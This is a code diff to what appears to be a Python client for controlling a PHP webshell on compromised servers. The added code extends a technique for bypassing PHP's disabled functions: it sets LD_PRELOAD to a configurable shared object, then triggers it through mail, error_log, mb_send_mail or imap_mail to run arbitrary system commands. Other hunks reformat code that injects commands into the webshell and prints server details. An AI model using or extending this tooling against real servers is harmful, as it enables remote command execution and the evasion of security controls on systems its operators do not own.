@@ -87,7 +87,8 @@ def send(data: str, raw: bool = False, **extra_params):
         params_dict["data"] = {}
     head = randstr(offset)
     tail = randstr(offset)
-    pwd_b64 = b64encode(gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
+    pwd_b64 = b64encode(
+        gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
     if not raw:
         data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
         if (gget("webshell.bypass_obd", "webshell")):
@@ -162,7 +163,8 @@ def print_webshell_info():
         gget("webshell.server_version", "webshell"),
         gget("webshell.obd", "webshell", "None")
     )
-    info_name = ("Web root:", "OS version:", "PHP version:", "Server version:", "Open_basedir:")
+    info_name = ("Web root:", "OS version:", "PHP version:",
+                 "Server version:", "Open_basedir:")
     for name, info in zip(info_name, info):
         print(name + "\n    " + info + "\n")
 
@@ -398,14 +400,28 @@ function pwn($cmd) {
     %s
 }""" % (base64_encode(command), ("print($o);" if print_result else ""))
     elif (bypass_df == 2):
+        ld_preload_func = gget("webshell.ld_preload_func", "webshell")
+        ld_preload_command = ""
+        if (ld_preload_func == "mail"):
+            ld_preload_command = "mail('','','','');"
+        elif (ld_preload_func == "error_log"):
+            ld_preload_command = "error_log('',1);"
+        elif (ld_preload_func == "mb_send_mail"):
+            ld_preload_command = "mb_send_mail('','','')"
+        elif (ld_preload_func == "imap_mail"):
+            ld_preload_command = 'imap_mail("1@a.com","0","1","2","3");'
         return """$p="/tmp/%s";
 putenv(base64_decode("%s"));
 putenv("rpath=$p");
-putenv("LD_PRELOAD=./bad.so");
-mail('','','','');
+putenv("LD_PRELOAD=%s");
+%s
 $o=file_get_contents($p);
 unlink($p);
-%s""" % (str(uuid4()), base64_encode(command), ("print($o);" if print_result else ""))
+%s""" % (str(uuid4()),
+         base64_encode(command),
+         gget("webshell.ld_preload_path", "webshell"),
+         ld_preload_command,
+         ("print($o);" if print_result else ""))
     else:
         return """print("No system execute function!\\n")"""
 
